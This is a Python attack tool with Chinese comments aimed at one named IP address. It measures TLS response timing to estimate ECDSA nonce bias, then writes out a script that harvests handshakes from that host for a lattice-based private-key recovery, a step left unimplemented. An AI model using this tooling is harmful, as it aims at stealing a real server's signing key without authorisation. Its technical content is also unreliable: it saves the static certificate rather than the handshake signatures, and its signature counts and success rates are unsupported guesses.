#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
时序泄露深度分析器
专门分析你发现的125.212.254.149的时序泄露
"""

import json
import sys
import numpy as np
import matplotlib.pyplot as plt
from typing import List, Dict

def load_timing_data(filename: str) -> Dict:
    """加载收集的时序数据"""
    with open(filename, 'r') as f:
        return json.load(f)

def deep_timing_analysis(data: Dict):
    """深度分析时序泄露"""
    signatures = data.get('signatures', [])
    if not signatures:
        print("[!] 没有找到签名数据")
        return
    
    # 提取时序
    times = [s['response_time'] for s in signatures]
    
    print("="*60)
    print("深度时序分析")
    print("="*60)
    
    # 基础统计
    avg_time = np.mean(times)
    std_time = np.std(times)
    median_time = np.median(times)
    
    print(f"\n[统计信息]")
    print(f"  样本数: {len(times)}")
    print(f"  平均值: {avg_time:.2f}ms")
    print(f"  标准差: {std_time:.2f}ms")
    print(f"  中位数: {median_time:.2f}ms")
    print(f"  最小值: {min(times):.2f}ms")
    print(f"  最大值: {max(times):.2f}ms")
    
    # 分组分析 - 这是关键！
    # 假设：快速响应 = MSB为0
    threshold = avg_time - std_time/2
    
    fast_group = [t for t in times if t < threshold]
    slow_group = [t for t in times if t > avg_time + std_time/2]
    middle_group = [t for t in times if threshold <= t <= avg_time + std_time/2]
    
    print(f"\n[分组分析] (阈值: {threshold:.2f}ms)")
    print(f"  快速组 (<{threshold:.2f}ms): {len(fast_group)}个 ({100*len(fast_group)/len(times):.1f}%)")
    print(f"  中间组: {len(middle_group)}个 ({100*len(middle_group)/len(times):.1f}%)")
    print(f"  慢速组 (>{avg_time + std_time/2:.2f}ms): {len(slow_group)}个 ({100*len(slow_group)/len(times):.1f}%)")
    
    if fast_group:
        print(f"\n  快速组平均: {np.mean(fast_group):.2f}ms")
    if slow_group:
        print(f"  慢速组平均: {np.mean(slow_group):.2f}ms")
        if fast_group:
            diff = np.mean(slow_group) - np.mean(fast_group)
            print(f"  时间差: {diff:.2f}ms")
            
            # 判断泄露类型
            if diff > 20:
                print(f"\n[!] 检测到严重时序泄露！")
                print(f"    差异{diff:.2f}ms足够进行侧信道攻击")
                estimate_msb_bias(fast_group, slow_group, times)

def estimate_msb_bias(fast_group: List[float], slow_group: List[float], all_times: List[float]):
    """估算MSB偏差"""
    print(f"\n[MSB偏差估算]")
    
    # 假设模型：快速 = MSB为0的概率高
    fast_ratio = len(fast_group) / len(all_times)
    slow_ratio = len(slow_group) / len(all_times)
    
    print(f"  如果快速响应表示MSB=0:")
    print(f"    MSB=0的概率: {fast_ratio:.1%}")
    print(f"    MSB=1的概率: {slow_ratio:.1%}")
    
    # 理论上应该是50/50
    expected = 0.5
    bias = abs(fast_ratio - expected)
    
    if bias > 0.1:  # 10%以上的偏差
        print(f"\n  [!!!] 发现显著偏差: {bias:.1%}")
        print(f"  这不是随机的！存在可利用的模式")
        
        # 计算需要多少签名进行格攻击
        if fast_ratio > 0.3:  # 30%以上是快速的
            required_sigs = estimate_required_signatures(bias)
            print(f"\n  [格攻击可行性]")
            print(f"    当前偏差率: {bias:.1%}")
            print(f"    建议收集: {required_sigs}个签名")
            print(f"    攻击成功率: {estimate_success_rate(bias):.1%}")

def estimate_required_signatures(bias: float) -> int:
    """估算格攻击需要的签名数"""
    # 经验公式：偏差越大，需要的签名越少
    if bias > 0.3:
        return 100
    elif bias > 0.2:
        return 200
    elif bias > 0.1:
        return 500
    else:
        return 1000

def estimate_success_rate(bias: float) -> float:
    """估算攻击成功率"""
    # 基于偏差的成功率估算
    if bias > 0.3:
        return 90
    elif bias > 0.2:
        return 70
    elif bias > 0.1:
        return 50
    else:
        return 30

def plot_timing_distribution(data: Dict):
    """绘制时序分布图"""
    try:
        import matplotlib.pyplot as plt
        
        signatures = data.get('signatures', [])
        times = [s['response_time'] for s in signatures]
        
        plt.figure(figsize=(12, 6))
        
        # 直方图
        plt.subplot(1, 2, 1)
        plt.hist(times, bins=30, edgecolor='black', alpha=0.7)
        plt.axvline(np.mean(times), color='red', linestyle='--', label=f'平均: {np.mean(times):.1f}ms')
        plt.xlabel('响应时间 (ms)')
        plt.ylabel('频次')
        plt.title('时序分布直方图')
        plt.legend()
        
        # 时间序列
        plt.subplot(1, 2, 2)
        plt.plot(times, 'b-', alpha=0.6)
        plt.axhline(np.mean(times), color='red', linestyle='--', label='平均')
        plt.axhline(np.mean(times) + np.std(times), color='orange', linestyle=':', label='±1σ')
        plt.axhline(np.mean(times) - np.std(times), color='orange', linestyle=':')
        plt.xlabel('样本索引')
        plt.ylabel('响应时间 (ms)')
        plt.title('时序变化趋势')
        plt.legend()
        
        plt.tight_layout()
        plt.savefig('timing_analysis.png', dpi=150)
        print(f"\n[+] 时序分布图已保存到: timing_analysis.png")
        
    except ImportError:
        print("\n[-] matplotlib未安装，跳过绘图")

def generate_attack_script(target: str, port: int, bias: float):
    """生成攻击脚本"""
    print(f"\n[生成攻击脚本]")
    
    script = f'''#!/usr/bin/env python3
# 针对 {target}:{port} 的ECDSA私钥恢复攻击
# 基于检测到的时序偏差: {bias:.1%}

import time
import socket
import ssl

TARGET = "{target}"
PORT = {port}
REQUIRED_SIGS = {estimate_required_signatures(bias)}

def collect_biased_signatures():
    """收集有偏差的签名"""
    signatures = []
    threshold = 300  # 基于你的分析调整
    
    for i in range(REQUIRED_SIGS * 2):  # 收集2倍，筛选快速的
        start = time.perf_counter()
        
        # TLS握手
        sock = socket.socket()
        sock.settimeout(5)
        sock.connect((TARGET, PORT))
        
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        ssock = ctx.wrap_socket(sock, server_hostname=TARGET)
        elapsed = (time.perf_counter() - start) * 1000
        
        if elapsed < threshold:  # 只保留快速响应
            # 这些可能是MSB=0的签名
            cert = ssock.getpeercert(binary_form=True)
            signatures.append({{
                'cert': cert,
                'time': elapsed,
                'likely_msb_zero': True
            }})
        
        ssock.close()
        sock.close()
        
        if len(signatures) >= REQUIRED_SIGS:
            break
        
        time.sleep(0.1)
    
    return signatures

# 收集签名
print(f"[*] 开始收集{{REQUIRED_SIGS}}个偏差签名...")
sigs = collect_biased_signatures()
print(f"[+] 收集到{{len(sigs)}}个可能的MSB=0签名")

# TODO: 实现格攻击
# 需要安装: pip install fpylll
'''
    
    filename = f"attack_{target.replace('.', '_')}.py"
    with open(filename, 'w') as f:
        f.write(script)
    
    print(f"  已生成: {filename}")
    print(f"  运行: python3 {filename}")

def main():
    if len(sys.argv) < 2:
        print("用法: python3 analyze_timing_leak.py <json文件>")
        print("示例: python3 analyze_timing_leak.py nonce_timing_125.212.254.149_1756843349.json")
        sys.exit(1)
    
    # 加载数据
    data = load_timing_data(sys.argv[1])
    
    # 深度分析
    deep_timing_analysis(data)
    
    # 绘图
    plot_timing_distribution(data)
    
    # 如果发现漏洞，生成攻击脚本
    analysis = data.get('analysis', {})
    if 'HIGH' in str(analysis.get('timing_leak', '')):
        target = data.get('target', '').split(':')[0]
        port = int(data.get('target', ':443').split(':')[1])
        
        # 估算偏差
        sigs = data.get('signatures', [])
        times = [s['response_time'] for s in sigs]
        avg = np.mean(times)
        fast = len([t for t in times if t < avg - 10])
        bias = abs(fast/len(times) - 0.5)
        
        if bias > 0.1:
            generate_attack_script(target, port, bias)
    
    print("\n[完成] 分析结果已输出")

if __name__ == "__main__":
    main()